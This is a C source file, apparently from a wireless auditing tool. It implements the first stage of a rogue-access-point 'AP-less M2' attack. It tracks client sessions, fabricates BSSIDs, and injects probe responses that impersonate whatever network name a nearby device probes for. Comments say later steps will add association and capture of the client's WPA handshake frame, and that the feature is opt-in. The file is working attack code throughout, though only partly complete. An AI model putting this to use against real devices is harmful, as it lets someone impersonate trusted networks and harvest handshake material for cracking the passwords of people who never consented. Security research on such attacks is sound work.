/* SPDX-License-Identifier: GPL-3.0-or-later */
/*
 * A: ap-less / rogue-AP M2 attack — rogue-AP responder state machine.
 * OFF by default; see apless.h and docs/IDEAS/ap-less-m2-attack.md.
 *
 * This increment lays the module + per-client session table. The frame logic
 * (directed probe-req -> rogue proberesp -> auth/assoc responses -> inject M1
 * -> capture M2) lands in subsequent increments, each validated on the Pi
 * (brcmfmac), since this host's rtl8812au can't inject over nl80211.
 */
#include "apless.h"
#include "dot11.h"
#include "inject.h"
#include "handshake.h"
#include "log.h"

#include <stdlib.h>
#include <string.h>

#define APLESS_MAX_SESSIONS   64
#define APLESS_SESSION_TTL    30   /* seconds before an incomplete session is dropped */

enum rogue_state {
	ROGUE_PROBED = 0,   /* answered a probe-req; awaiting auth/assoc */
	ROGUE_M1_SENT,      /* associated + sent our M1; awaiting the client's M2 */
	ROGUE_DONE,         /* M2 captured */
};

/* One rogue-AP session: an ESSID a client probed for, the fabricated BSSID we
 * answer from, our chosen ANONCE (needed to pair the client's M2), and where
 * we are in the fake 4-way. */
struct rogue {
	int              in_use;
	uint8_t          client[6];
	uint8_t          bssid[6];          /* fabricated rogue-AP MAC */
	uint8_t          essid_len;
	char             essid[DOT11_SSID_MAX + 1];
	uint8_t          anonce[32];
	enum rogue_state state;
	time_t           created;
	time_t           last;
};

#define APLESS_RESP_COOLDOWN  1   /* min seconds between rogue proberesps per session */

struct apless {
	struct handshake *hs;
	struct rogue      sessions[APLESS_MAX_SESSIONS];
	uint32_t          nic;              /* increments to fabricate distinct BSSIDs */
};

struct apless *apless_create(struct handshake *hs)
{
	struct apless *a = calloc(1, sizeof *a);
	if (!a) return NULL;
	a->hs = hs;
	log_info("apless: rogue-AP M2 responder armed (opt-in attack)");
	return a;
}

void apless_destroy(struct apless *a)
{
	free(a);
}

/* Find the session for this (client, ESSID), or claim a free slot and
 * fabricate a locally-administered rogue BSSID for it. NULL if the table is
 * full. */
static struct rogue *session_get(struct apless *a, const uint8_t client[6],
                                 const char *essid, uint8_t essid_len, time_t now)
{
	struct rogue *freeslot = NULL;
	for (int i = 0; i < APLESS_MAX_SESSIONS; i++) {
		struct rogue *r = &a->sessions[i];
		if (!r->in_use) { if (!freeslot) freeslot = r; continue; }
		if (memcmp(r->client, client, 6) == 0 &&
		    r->essid_len == essid_len &&
		    memcmp(r->essid, essid, essid_len) == 0)
			return r;
	}
	if (!freeslot) return NULL;
	memset(freeslot, 0, sizeof *freeslot);
	freeslot->in_use   = 1;
	memcpy(freeslot->client, client, 6);
	freeslot->essid_len = essid_len;
	memcpy(freeslot->essid, essid, essid_len);
	freeslot->essid[essid_len] = '\0';
	/* fabricated BSSID: locally-administered OUI + incrementing NIC */
	freeslot->bssid[0] = 0x02; freeslot->bssid[1] = 0x11; freeslot->bssid[2] = 0x22;
	freeslot->bssid[3] = (a->nic >> 16) & 0xff;
	freeslot->bssid[4] = (a->nic >> 8)  & 0xff;
	freeslot->bssid[5] =  a->nic        & 0xff;
	a->nic++;
	freeslot->state   = ROGUE_PROBED;
	freeslot->created = now;
	return freeslot;
}

void apless_on_frame(struct apless *a, struct inject *inject,
                     const struct dot11_info *d,
                     const uint8_t *raw, size_t raw_len, int channel)
{
	(void)raw; (void)raw_len;
	if (!a || !inject || !d) return;

	if (d->kind == DOT11_FRAME_PROBE_REQ) {
		/* Directed probes only — ignore wildcard/broadcast (phase 2). */
		if (!d->has_ssid || d->ssid_len == 0) return;
		time_t now = time(NULL);
		struct rogue *r = session_get(a, d->sa, d->ssid, d->ssid_len, now);
		if (!r) return;
		if (r->last && now - r->last < APLESS_RESP_COOLDOWN) return;
		r->last = now;
		/* Impersonate the ESSID the client is looking for. The auth/assoc +
		 * M1/M2 steps land in the next increments. */
		inject_probe_response(inject, r->bssid, r->client,
		                      r->essid, r->essid_len, channel);
	}
}

void apless_tick(struct apless *a, time_t now)
{
	if (!a) return;
	for (int i = 0; i < APLESS_MAX_SESSIONS; i++) {
		struct rogue *r = &a->sessions[i];
		if (r->in_use && r->state != ROGUE_DONE &&
		    now - r->created > APLESS_SESSION_TTL)
			memset(r, 0, sizeof *r);   /* drop the stale session */
	}
}
